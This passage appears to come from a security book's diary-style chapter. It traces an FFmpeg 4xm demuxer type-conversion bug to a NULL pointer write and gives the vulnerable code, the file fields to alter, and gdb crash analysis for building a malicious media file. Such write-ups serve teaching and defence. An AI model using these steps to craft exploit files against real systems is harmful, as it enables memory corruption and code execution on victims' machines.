<html><head></head><body><div class="chapter" title="Chapter&#xA0;4.&#xA0;NULL Pointer FTW"><div class="titlepage"><div><div><h1 class="title"><a id="null_pointer_ftw"/>Chapter 4. NULL Pointer FTW</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Saturday, January 24, 2009</em></span></p><p><span class="emphasis"><em>Dear Diary</em></span>,</p></div><p>I found a really beautiful bug today: a type conversion vulnerability leading to a NULL pointer dereference (see Section A.2). Under normal circumstances this wouldn’t be a big deal, since the bug affects a user space library, which generally means that at worst it would crash a user space application. But this bug is different from the average user space NULL pointer dereferences, and it’s possible to exploit this vulnerability to execute arbitrary code.<a id="IDX-CHP-4-0001" class="indexterm"/><a id="IDX-CHP-4-0002" class="indexterm"/><a id="IDX-CHP-4-0003" class="indexterm"/></p><p>The vulnerability affects the FFmpeg multimedia library that is used by many popular software projects, including Google Chrome, VLC media player, MPlayer, and Xine to name just a few. There are also rumors that YouTube uses FFmpeg as backend conversion software.<sup>[<a href="ch04s05.html#ftn.CHP-4-FN-1" class="footnoteref">37</a>]</sup><a id="IDX-CHP-4-0004" class="indexterm"/><a id="IDX-CHP-4-0005" class="indexterm"/></p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>There are other examples of exploitable user space NULL pointer dereferences. See Mark Dowd’s MacGyver exploit for Flash</em></span> (<a class="ulink" href="http://blogs.iss.net/archive/flash.html">http://blogs.iss.net/archive/flash.html</a>) <span class="emphasis"><em>or Justin Schuh’s Firefox bug</em></span> (<a class="ulink" href="http://blogs.iss.net/archive/cve-2008-0017.html">http://blogs.iss.net/archive/cve-2008-0017.html</a>).</p></div><div class="sect1" title="4.1 Vulnerability Discovery"><div class="titlepage"><div><div><h1 class="title"><a id="vulnerability_discovery-id2"/>4.1 Vulnerability Discovery</h1></div></div></div><p>To find the vulnerability I did the following:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Step 1: List the demuxers of FFmpeg.<a id="IDX-CHP-4-0006" class="indexterm"/></p></li><li class="listitem"><p>Step 2: Identify the input data.</p></li><li class="listitem"><p>Step 3: Trace the input data.</p></li></ul></div><div class="sect2" title="Step 1: List the Demuxers of FFmpeg"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_list_the_demuxers_of_ffmpeg"/>Step 1: List the Demuxers of FFmpeg</h2></div></div></div><p>After getting the latest source code revision from the FFmpeg SVN repository, I generated a list of the demuxers that are available in the <code class="literal">libavformat</code> library, which is included with FFmpeg (see <a class="xref" href="ch04.html#ffmpeg_libavformat_demuxers" title="Figure 4-1. FFmpeg libavformat demuxers">Figure 4-1</a>). I noticed that FFmpeg separates most demuxers in different C files under the directory <span class="emphasis"><em>libavformat/</em></span>.</p><div class="figure"><a id="ffmpeg_libavformat_demuxers"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e3555"/><img src="httpatomoreillycomsourcenostarchimages939263.png.jpg" alt="FFmpeg libavformat demuxers"/></div></div><p class="title">Figure 4-1. FFmpeg libavformat demuxers</p></div><div class="note" title="Note"><h3 class="title">Note</h3><p>FFmpeg development has moved to a Git repository,<sup>[<a href="ch04s05.html#ftn.CHP-4-FN-2" class="footnoteref">38</a>]</sup>and the SVN repository is no longer updated. The vulnerable source code revision (SVN-r16556) of FFmpeg can now be downloaded from this book’s website.<sup>[<a href="ch04s05.html#ftn.CHP-4-FN-3" class="footnoteref">39</a>]</sup></p></div></div><div class="sect2" title="Step 2: Identify the Input Data"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_identify_the_input_data-id2"/>Step 2: Identify the Input Data</h2></div></div></div><p>Next, I tried to identify the input data processed by the demuxers. While reading the source code, I discovered that most demuxers declare a function called <em class="replaceable"><code>demuxername</code></em><code class="literal">_read_header()</code>, which usually takes a parameter of the type <code class="literal">AVFormatContext</code>. This function declares and initializes a pointer that looks like this:</p><a id="I_programlisting4_d1e3579"/><pre class="programlisting">[..]
ByteIOContext *pb = s-&gt;pb;
[..]</pre><p>Many different <code class="literal">get_</code><em class="replaceable"><code>something</code></em> functions (e.g., <code class="literal">get_le32()</code>, <code class="literal">get_buffer()</code>) and special macros (e.g., <code class="literal">AV_RL32</code>, <code class="literal">AV_RL16</code>) are then used to extract portions of the data pointed to by <code class="literal">pb</code>. At this point, I was pretty sure that <code class="literal">pb</code> had to be a pointer to the input data of the media files being processed.</p></div><div class="sect2" title="Step 3: Trace the Input Data"><div class="titlepage"><div><div><h2 class="title"><a id="step_3_colon_trace_the_input_data-id2"/>Step 3: Trace the Input Data</h2></div></div></div><p>I decided to search for bugs by tracing the input data of each demuxer at the source code level. I started with the first demuxer file from the list, called <span class="emphasis"><em>4xm.c</em></span>. While auditing the demuxer of the 4X movie file format,<sup>[<a href="ch04s05.html#ftn.CHP-4-FN-4" class="footnoteref">40</a>]</sup> I found the vulnerability shown in the listing below.<a id="IDX-CHP-4-0007" class="indexterm"/></p><div class="variablelist"><dl><dt><span class="term"><span class="strong"><strong>Source code file</strong></span></span></dt><dd><p><span class="emphasis"><em>libavformat/4xm.c</em></span></p></dd><dt><span class="term"><span class="strong"><strong>Function</strong></span></span></dt><dd><p><code class="literal">fourxm_read_header()</code></p></dd></dl></div><a id="I_programlisting4_d1e3637"/><pre class="programlisting">[..]
 93    static int fourxm_read_header(AVFormatContext *s,
 94                                  AVFormatParameters *ap)
 95    {
 <strong class="userinput"><code>96      ByteIOContext *pb = s-&gt;pb;</code></strong>
 ..
<strong class="userinput"><code>101      unsigned char *header;</code></strong>
 ..
<strong class="userinput"><code>103      int current_track = −1;</code></strong>
 ..
<strong class="userinput"><code>106      fourxm-&gt;track_count = 0;</code></strong>
<strong class="userinput"><code>107      fourxm-&gt;tracks = NULL;</code></strong>
 ..
120       /* allocate space for the header and load the whole thing */
<strong class="userinput"><code>121       header = av_malloc(header_size);</code></strong>
122       if (!header)
123           return AVERROR(ENOMEM);
<strong class="userinput"><code>124       if (get_buffer(pb, header, header_size) != header_size)</code></strong>
125           return AVERROR(EIO);
 ..
<strong class="userinput"><code>160      } else if (fourcc_tag == strk_TAG) {</code></strong>
161          /* check that there is enough data */
162          if (size != strk_SIZE) {
163              av_free(header);
164              return AVERROR_INVALIDDATA;
165          }
<strong class="userinput"><code>166          current_track = AV_RL32(&amp;header[i + 8]);</code></strong>
<strong class="userinput"><code>167          if (current_track + 1 &gt; fourxm-&gt;track_count) {</code></strong>
168             fourxm-&gt;track_count = current_track + 1;
169             if((unsigned)fourxm-&gt;track_count &gt;= UINT_MAX / sizeof(AudioTrack))
170               return −1;
<strong class="userinput"><code>171             fourxm-&gt;tracks = av_realloc(fourxm-&gt;tracks,</code></strong>
<strong class="userinput"><code>172                 fourxm-&gt;track_count * sizeof(AudioTrack));</code></strong>
173             if (!fourxm-&gt;tracks) {
174               av_free(header);
175               return AVERROR(ENOMEM);
176             }
177          }
<strong class="userinput"><code>178          fourxm-&gt;tracks[current_track].adpcm = AV_RL32(&amp;header[i + 12]);</code></strong>
<strong class="userinput"><code>179          fourxm-&gt;tracks[current_track].channels = AV_RL32(&amp;header[i + 36]);</code></strong>
<strong class="userinput"><code>180          fourxm-&gt;tracks[current_track].sample_rate = AV_RL32(&amp;header[i + 40]);</code></strong>
<strong class="userinput"><code>181          fourxm-&gt;tracks[current_track].bits = AV_RL32(&amp;header[i + 44]);</code></strong>
[..]</pre><p>The <code class="literal">get_buffer()</code> function in line 124 copies input data from the processed media file into the heap buffer pointed to by <code class="literal">header</code> (see lines 101 and 121). If the media file contains a so-called <code class="literal">strk</code> chunk (see line 160) the <code class="literal">AV_RL32()</code> macro in line 166 reads an unsigned int from the header data and stores the value in the signed int variable <code class="literal">current_track</code> (see line 103). The conversion of a user-controlled unsigned int value from the media file to a signed int could cause a conversion bug! My interest piqued, I continued to search through the code, excited that I might be on to something.</p><p>The <code class="literal">if</code> statement in line 167 checks whether the user-controlled value of <code class="literal">current_track + 1</code> is greater than <code class="literal">fourxm-&gt;track_count</code>. The signed int variable <code class="literal">fourxm-&gt;track_count</code> is initialized with 0 (see line 106). Supplying a value &gt;= <code class="literal">0x80000000</code> for <code class="literal">current_track</code> causes a change in sign that results in <code class="literal">current_track</code> being interpreted as negative (to find out why, see Section A.3). If <code class="literal">current_track</code> is interpreted as negative, the <code class="literal">if</code> statement in line 167 will always return <code class="literal">false</code> (as the signed int variable <code class="literal">fourxm-&gt;track_count</code> has a value of zero), and the buffer allocation in line 171 will never be reached. Clearly, it was a bad idea to convert that user-controlled unsigned int to a signed int.</p><p>Since <code class="literal">fourxm-&gt;tracks</code> is initialized with <code class="literal">NULL</code> (see line 107) and line 171 is never reached, the write operations in lines 178–181 lead to four NULL pointer dereferences. Because NULL is dereferenced by the user-controlled value of <code class="literal">current_track</code>, it’s possible to write user-controlled data at a wide range of memory locations.</p><div class="note" title="Note"><h3 class="title">Note</h3><p>Perhaps you wouldn’t technically call this a NULL pointer “dereference,” since I’m not actually dereferencing NULL but a nonexistent structure that’s located at a user-controlled offset from NULL. In the end it depends on how you define the term <span class="emphasis"><em>NULL pointer dereference</em></span>.</p></div><p>The expected behavior of FFmpeg is shown in <a class="xref" href="ch04.html#expected_behavior_when_ffmpeg_operates_n" title="Figure 4-2. Expected behavior when FFmpeg operates normally">Figure 4-2</a> as follows:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p><code class="literal">fourxm-&gt;tracks</code> is initialized with <code class="literal">NULL</code> (see line 107).</p></li><li class="listitem"><p>If the processed media file contains a <code class="literal">strk</code> chunk, the value of <code class="literal">current_track</code> is extracted from the user-controlled data of the chunk (see line 166).</p></li><li class="listitem"><p>If the value of <code class="literal">current_track + 1</code> is greater than zero, a heap buffer is allocated.</p></li><li class="listitem"><p>The heap buffer pointed to by <code class="literal">fourxm-&gt;tracks</code> is allocated (see lines 171 and 172).</p></li><li class="listitem"><p>Data from the media file is copied into the heap buffer, while <code class="literal">current_track</code> is used as an array index into the buffer (see lines 178–181).</p></li><li class="listitem"><p>When this behavior occurs, there is no security problem.</p></li></ol></div><div class="figure"><a id="expected_behavior_when_ffmpeg_operates_n"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e3805"/><img src="httpatomoreillycomsourcenostarchimages939265.png.jpg" alt="Expected behavior when FFmpeg operates normally"/></div></div><p class="title">Figure 4-2. Expected behavior when FFmpeg operates normally</p></div><p><a class="xref" href="ch04.html#unexpected_behavior_of_ffmpeg_causing_me" title="Figure 4-3. Unexpected behavior of FFmpeg causing memory corruption">Figure 4-3</a> shows what happens when this bug affects FFmpeg:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p><code class="literal">fourxm-&gt;tracks</code> is initialized with <code class="literal">NULL</code> (see line 107).</p></li><li class="listitem"><p>If the processed media file contains a <code class="literal">strk</code> chunk, the value of <code class="literal">current_track</code> is extracted from the user-controlled data of the chunk (see line 166).</p></li><li class="listitem"><p>If the value of <code class="literal">current_track + 1</code> is less than zero, the heap buffer isn’t allocated.</p></li><li class="listitem"><p><code class="literal">fourxm-&gt;tracks</code> still points to memory address <code class="literal">NULL</code>.</p></li><li class="listitem"><p>The resulting NULL pointer is then dereferenced by the user-controlled value of <code class="literal">current_track</code>, and four 32-bit values of user-controlled data are assigned to the dereferenced locations (see lines 178–181).</p></li><li class="listitem"><p>Four user-controlled memory locations can be overwritten with four user-controlled data bytes each.</p></li></ol></div><div class="figure"><a id="unexpected_behavior_of_ffmpeg_causing_me"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e3858"/><img src="httpatomoreillycomsourcenostarchimages939267.png.jpg" alt="Unexpected behavior of FFmpeg causing memory corruption"/></div></div><p class="title">Figure 4-3. Unexpected behavior of FFmpeg causing memory corruption</p></div><p>What a beautiful bug!</p></div></div></div>
<div class="sect1" title="4.2 Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="exploitation-id2"/>4.2 Exploitation</h1></div></div></div><p>To exploit the vulnerability I did the following:</p><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>The vulnerability affects all operating system platforms supported by FFmpeg. The platform that I used throughout this chapter was the default installation of Ubuntu Linux 9.04 (32-bit)</em></span>.<a id="IDX-CHP-4-0008" class="indexterm"/></p></div><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Step 1: Find a sample 4X movie file with a valid <code class="literal">strk</code> chunk.</p></li><li class="listitem"><p>Step 2: Learn about the layout of the <code class="literal">strk</code> chunk.</p></li><li class="listitem"><p>Step 3: Manipulate the <code class="literal">strk</code> chunk to crash FFmpeg.</p></li><li class="listitem"><p>Step 4: Manipulate the <code class="literal">strk</code> chunk to get control over <code class="literal">EIP</code>.</p></li></ul></div><p>There are different ways to exploit file format bugs. I could either create a file with the right format from scratch or alter an existing file. I chose the latter approach. I used the website <a class="ulink" href="http://samples.mplayerhq.hu/">http://samples.mplayerhq.hu/</a> to find a 4X movie file suitable for testing this vulnerability. I could have built a file myself, but downloading a preexisting file is fast and easy.</p><div class="sect2" title="Step 1: Find a Sample 4X Movie File with a Valid strk Chunk"><div class="titlepage"><div><div><h2 class="title"><a id="step_1_colon_find_a_sample_4x_movie_file"/>Step 1: Find a Sample 4X Movie File with a Valid strk Chunk</h2></div></div></div><p>I used the following to get a sample file from <a class="ulink" href="http://samples.mplayerhq.hu/">http://samples.mplayerhq.hu/</a>.</p><a id="I_programlisting4_d1e3919"/><pre class="programlisting">linux$ <strong class="userinput"><code>wget -q http://samples.mplayerhq.hu/ga</code></strong>
<strong class="userinput"><code>me-formats/4xm/</code></strong>
                     → <strong class="userinput"><code>TimeGatep01s01n01a02_2.4xm</code></strong></pre><p>After downloading the file, I renamed it <span class="emphasis"><em>original.4xm</em></span>.</p></div><div class="sect2" title="Step 2: Learn About the Layout of the strk Chunk"><div class="titlepage"><div><div><h2 class="title"><a id="step_2_colon_learn_about_the_layout_of_t"/>Step 2: Learn About the Layout of the strk Chunk</h2></div></div></div><p>According to the 4X movie file format description, a <code class="literal">strk</code> chunk has the following structure:</p><a id="I_programlisting4_d1e3942"/><pre class="programlisting">bytes 0-3    fourcc: 'strk'
bytes 4-7    length of strk structure (40 or 0x28 bytes)
bytes 8-11   track number
bytes 12-15  audio type: 0 = PCM, 1 = 4X IMA ADPCM
bytes 16-35  unknown
bytes 36-39  number of audio channels
bytes 40-43  audio sample rate
bytes 44-47  audio sample resolution (8 or 16 bits)</pre><p>The <code class="literal">strk</code> chunk of the downloaded sample file starts at file offset <code class="literal">0x1a6</code>, as shown in <a class="xref" href="ch04s02.html#a_strk_chunk_from_the_4x_movie_sample_fi" title="Figure 4-4. A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in Table 4-1.">Figure 4-4</a>:</p><div class="figure"><a id="a_strk_chunk_from_the_4x_movie_sample_fi"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e3962"/><img src="httpatomoreillycomsourcenostarchimages939269.png.jpg" alt="A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in ."/></div></div><p class="title">Figure 4-4. A <code class="literal">strk</code> chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in <a class="xref" href="ch04s02.html#components_of_strk_chunk_layout_shown_in" title="Table 4-1. Components of strk Chunk Layout Shown in Figure 4-4">Table 4-1</a>.</p></div><p><a class="xref" href="ch04s02.html#components_of_strk_chunk_layout_shown_in" title="Table 4-1. Components of strk Chunk Layout Shown in Figure 4-4">Table 4-1</a> describes the layout of the <code class="literal">strk</code> chunk illustrated in <a class="xref" href="ch04s02.html#a_strk_chunk_from_the_4x_movie_sample_fi" title="Figure 4-4. A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in Table 4-1.">Figure 4-4</a>.</p><div class="table"><a id="components_of_strk_chunk_layout_shown_in"/><p class="title">Table 4-1. Components of strk Chunk Layout Shown in <a class="xref" href="ch04s02.html#a_strk_chunk_from_the_4x_movie_sample_fi" title="Figure 4-4. A strk chunk from the 4X movie sample file I downloaded. The numbers shown are referenced in Table 4-1.">Figure 4-4</a></p><div class="table-contents"><table summary="Components of strk Chunk Layout Shown in " style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/><col/></colgroup><thead><tr><th style="text-align: left" valign="bottom"><p>Reference</p></th><th style="text-align: left" valign="bottom"><p>Header offset</p></th><th style="text-align: left" valign="bottom"><p>Description</p></th></tr></thead><tbody><tr><td style="text-align: left" valign="top"><p>(1)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">fourcc: 'strk'</code></p></td></tr><tr><td style="text-align: left" valign="top"><p>(2)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i+4]</code></p></td><td style="text-align: left" valign="top"><p>length of <code class="literal">strk</code> structure (<code class="literal">0x28</code> bytes)</p></td></tr><tr><td style="text-align: left" valign="top"><p>(3)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i+8]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">track number</code> (this is the <code class="literal">current_track</code> variable from FFmpeg source code)</p></td></tr><tr><td style="text-align: left" valign="top"><p>(4)</p></td><td style="text-align: left" valign="top"><p><code class="literal">&amp;header[i+12]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">audio type</code> (this is the value that gets written at the first dereferenced memory location)</p></td></tr></tbody></table></div></div><p>To exploit this vulnerability, I knew that I would need to set the values of <code class="literal">track number</code> at <code class="literal">&amp;header[i+8]</code> (that corresponds to <code class="literal">current_track</code> from FFmpeg source code) and <code class="literal">audio type</code> at <code class="literal">&amp;header[i+12]</code>. If I set the values properly, the value of <code class="literal">audio type</code> would be written at the memory location <code class="literal">NULL + track number</code>, which is the same as <code class="literal">NULL + current_track</code>.</p><p>In summary, the (nearly) arbitrary memory write operations from the FFmpeg source code are as follows:</p><a id="I_programlisting4_d1e4082"/><pre class="programlisting">[..]
178       fourxm-&gt;tracks[current_track].adpcm = AV_RL32(&amp;header[i + 12]);
179       fourxm-&gt;tracks[current_track].channels = AV_RL32(&amp;header[i + 36]);
180       fourxm-&gt;tracks[current_track].sample_rate = AV_RL32(&amp;header[i + 40]);
181       fourxm-&gt;tracks[current_track].bits = AV_RL32(&amp;header[i + 44]);
[..]</pre><p>And each corresponds to this pseudo code:</p><a id="I_programlisting4_d1e4087"/><pre class="programlisting">NULL[user_controlled_value].offset = user_controlled_data;</pre></div><div class="sect2" title="Step 3: Manipulate the strk Chunk to Crash FFmpeg"><div class="titlepage"><div><div><h2 class="title"><a id="step_3_colon_manipulate_the_strk_chunk_t"/>Step 3: Manipulate the strk Chunk to Crash FFmpeg</h2></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Compiling FFmpeg: linux$ ./configure; make These commands will compile two different binary versions of FFmpeg</em></span>:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p><span class="underline">ffmpeg</span> <span class="emphasis"><em>Binary without debugging symbols</em></span></p></li><li class="listitem"><p><span class="underline">ffmpeg_g</span> <span class="emphasis"><em>Binary with debugging symbols</em></span></p></li></ul></div></div><p>After compiling the vulnerable FFmpeg source code revision 16556, I tried to convert the 4X movie into an AVI file to verify that the compilation was successful and that FFmpeg worked flawlessly.</p><a id="I_programlisting4_d1e4114"/><pre class="programlisting">linux$ <strong class="userinput"><code>./ffmpeg_g -i original.4xm original.avi</code></strong>
FFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.
  configuration:
  libavutil     49.12. 0 / 49.12. 0
  libavcodec    52.10. 0 / 52.10. 0
  libavformat   52.23. 1 / 52.23. 1
  libavdevice   52. 1. 0 / 52. 1. 0
  built on Jan 24 2009 02:30:50, gcc: 4.3.3
Input #0, 4xm, from 'original.4xm':
  Duration: 00:00:13.20, start: 0.000000, bitrate: 704 kb/s
    Stream #0.0: Video: 4xm, rgb565, 640x480, 15.00 tb(r)
    Stream #0.1: Audio: pcm_s16le, 22050 Hz, stereo, s16, 705 kb/s
Output #0, avi, to 'original.avi':
    Stream #0.0: Video: mpeg4, yuv420p, 640x480, q=2-31, 200 kb/s, 15.00 tb(c)
    Stream #0.1: Audio: mp2, 22050 Hz, stereo, s16, 64 kb/s
Stream mapping:
  Stream #0.0 -&gt; #0.0
  Stream #0.1 -&gt; #0.1
Press [q] to stop encoding
frame=   47 fps=  0 q=2.3 Lsize=     194kB time=3.08 bitrate= 515.3kbits/s
video:158kB audio:24kB global headers:0kB muxing overhead 6.715897%</pre><p>Next, I modified the values of <code class="literal">track number</code> as well as <code class="literal">audio type</code> in the <code class="literal">strk</code> chunk of the sample file.</p><p>As illustrated in <a class="xref" href="ch04s02.html#the_strk_chunk_of_the_sample_file_after" title="Figure 4-5. The strk chunk of the sample file after I altered it. The changes I made are highlighted and framed, and the numbers shown are referenced in the text above.">Figure 4-5</a>, I changed the value of <code class="literal">track number</code> to <code class="literal">0xaaaaaaaa</code> (1) and the value of <code class="literal">audio type</code> to <code class="literal">0xbbbbbbbb</code> (2). I named the new file <span class="emphasis"><em>poc1.4xm</em></span> and tried to convert it with FFmpeg (see Section B.4 for a description of the following debugger commands).</p><div class="figure"><a id="the_strk_chunk_of_the_sample_file_after"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e4156"/><img src="httpatomoreillycomsourcenostarchimages939271.png.jpg" alt="The strk chunk of the sample file after I altered it. The changes I made are highlighted and framed, and the numbers shown are referenced in the text above."/></div></div><p class="title">Figure 4-5. The <code class="literal">strk</code> chunk of the sample file after I altered it. The changes I made are highlighted and framed, and the numbers shown are referenced in the text above.</p></div><a id="I_programlisting4_d1e4161"/><pre class="programlisting">linux$ <strong class="userinput"><code>gdb ./ffmpeg_g</code></strong>
GNU gdb 6.8-debian
Copyright (C) 2008 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu"...

(gdb) <strong class="userinput"><code>set disassembly-flavor intel</code></strong>

(gdb) <strong class="userinput"><code>run -i poc1.4xm</code></strong>
Starting program: /home/tk/BHD/ffmpeg/ffmpeg_g -i poc1.4xm
FFmpeg version SVN-r16556, Copyright (c) 2000-2009 Fabrice Bellard, et al.
  configuration:
  libavutil     49.12. 0 / 49.12. 0
  libavcodec    52.10. 0 / 52.10. 0
  libavformat   52.23. 1 / 52.23. 1
  libavdevice   52. 1. 0 / 52. 1. 0
  built on Jan 24 2009 02:30:50, gcc: 4.3.3

<strong class="userinput"><code>Program received signal SIGSEGV, Segmentation fault.</code></strong>
<strong class="userinput"><code>0x0809c89d in fourxm_read_header (s=0x8913330,</code></strong>
 <strong class="userinput"><code>ap=0xbf8b6c24) at libavformat/4xm.c:178</code></strong>
<strong class="userinput"><code>178     fourxm-&gt;tracks[current_track].adpcm = AV_RL32(&amp;header[i + 12]);</code></strong></pre><p>As expected, FFmpeg crashed with a segmentation fault at source code line 178. I further analyzed the FFmpeg process within the debugger to see what exactly caused the crash.</p><a id="I_programlisting4_d1e4186"/><pre class="programlisting">(gdb) <strong class="userinput"><code>info registers</code></strong>
<strong class="userinput"><code>eax            0xbbbbbbbb</code></strong>    −1145324613
ecx            0x891c400     143770624
edx            0x0           0
<strong class="userinput"><code>ebx            0xaaaaaaaa</code></strong>    −1431655766
esp            0xbf8b6aa0    0xbf8b6aa0
ebp            0x55555548    0x55555548
esi            0x891c3c0     143770560
edi            0x891c340     143770432
eip            0x809c89d     0x809c89d &lt;fourxm_read_header+509&gt;
eflags         0x10207       [ CF PF IF RF ]
cs             0x73          115
ss             0x7b          123
ds             0x7b          123
es             0x7b          123
fs             0x0           0
gs             0x33          51</pre><p>At the time of the crash, the registers <code class="literal">EAX</code> and <code class="literal">EBX</code> were filled with the values that I input for <code class="literal">audio type</code> (<code class="literal">0xbbbbbbbb</code>) and <code class="literal">track number</code> (<code class="literal">0xaaaaaaaa</code>). Next, I asked the debugger to display the last instruction executed by FFmpeg:</p><a id="I_programlisting4_d1e4219"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1i $eip</code></strong>
0x809c89d &lt;fourxm_read_header+509&gt;:    mov    DWORD PTR [edx+ebp*1+0x10],eax</pre><p>As the debugger output shows, the instruction that caused the segmentation fault was attempting to write the value <code class="literal">0xbbbbbbbb</code> at an address calculated using my value for <code class="literal">track number</code>.</p><p>To control the memory write, I needed to know how the destination address of the write operation was calculated. I found the answer by looking at the following assembly code:</p><a id="I_programlisting4_d1e4234"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/7i $eip - 21</code></strong>
0x809c888 &lt;fourxm_read_header+488&gt;:    lea    ebp,[ebx+ebx*4]
0x809c88b &lt;fourxm_read_header+491&gt;:    mov    eax,DWORD PTR [esp+0x34]
0x809c88f &lt;fourxm_read_header+495&gt;:    mov    edx,DWORD PTR [esi+0x10]
0x809c892 &lt;fourxm_read_header+498&gt;:    mov    DWORD PTR [esp+0x28],ebp
0x809c896 &lt;fourxm_read_header+502&gt;:    shl    ebp,0x2
0x809c899 &lt;fourxm_read_header+505&gt;:    mov    eax,DWORD PTR [ecx+eax*1+0xc]
0x809c89d &lt;fourxm_read_header+509&gt;:    mov    DWORD PTR [edx+ebp*1+0x10],eax</pre><p>These instructions correspond to the following C source line:</p><a id="I_programlisting4_d1e4241"/><pre class="programlisting">[..]
178       fourxm-&gt;tracks[current_track].adpcm = AV_RL32(&amp;header[i + 12]);
[..]</pre><p><a class="xref" href="ch04s02.html#list_of_the_assembler_instructions_and" title="Table 4-2. List of the Assembler Instructions and the Result of Each Instruction">Table 4-2</a> explains the results of these instructions.</p><p>Since <code class="literal">EBX</code> contains the value I supplied for <code class="literal">current_track</code> and <code class="literal">EDX</code> contains the NULL pointer of <code class="literal">fourxm-&gt;tracks</code>, the calculation can be expressed as this:</p><a id="I_programlisting4_d1e4260"/><pre class="programlisting">edx + ((ebx + ebx * 4) &lt;&lt; 2) + 0x10 = destination address of the write operation</pre><div class="table"><a id="list_of_the_assembler_instructions_and"/><p class="title">Table 4-2. List of the Assembler Instructions and the Result of Each Instruction</p><div class="table-contents"><table summary="List of the Assembler Instructions and the Result of Each Instruction" style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><thead><tr><th style="text-align: left" valign="bottom"><p>Instruction<a id="IDX-CHP-4-0009" class="indexterm"/><a id="IDX-CHP-4-0010" class="indexterm"/><a id="IDX-CHP-4-0011" class="indexterm"/></p></th><th style="text-align: left" valign="bottom"><p>Result</p></th></tr></thead><tbody><tr><td style="text-align: left" valign="top"><p><code class="literal">lea ebp,[ebx+ebx*4]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">ebp = ebx + ebx * 4</code> (The <code class="literal">EBX</code> register contains the user-defined value of <code class="literal">current_track</code> (<code class="literal">0xaaaaaaaa</code>).)</p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov eax,DWORD PTR [esp+0x34]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">eax</code> = array index <code class="literal">i</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov edx,DWORD PTR [esi+0x10]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">edx = fourxm-&gt;tracks</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">shl ebp,0x2</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">ebp = ebp &lt;&lt; 2</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov eax,DWORD PTR [ecx+eax*1+0xc]</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">eax = AV_RL32(&amp;header[i + 12]);</code> or <code class="literal">eax = ecx[eax + 0xc];</code></p></td></tr><tr><td style="text-align: left" valign="top"><p><code class="literal">mov DWORD PTR [edx+ebp*1+0x10],eax</code></p></td><td style="text-align: left" valign="top"><p><code class="literal">fourxm-&gt;tracks[current_track].adpcm = eax;</code> or <code class="literal">edx[ebp + 0x10] = eax;</code></p></td></tr></tbody></table></div></div><p>Or in a more simplified form:</p><a id="I_programlisting4_d1e4362"/><pre class="programlisting">edx + (ebx * 20) + 0x10 = destination address of the write operation</pre><p>I supplied the value <code class="literal">0xaaaaaaaa</code> for <code class="literal">current_track</code> (<code class="literal">EBX</code> register), so the calculation should look like this:</p><a id="I_programlisting4_d1e4375"/><pre class="programlisting">NULL + (0xaaaaaaaa * 20) + 0x10 = 0x55555558</pre><p>The result of <code class="literal">0x55555558</code> can be confirmed with the help of the debugger:</p><a id="I_programlisting4_d1e4382"/><pre class="programlisting">(gdb) <strong class="userinput"><code>x/1x $edx+$ebp+0x10</code></strong>
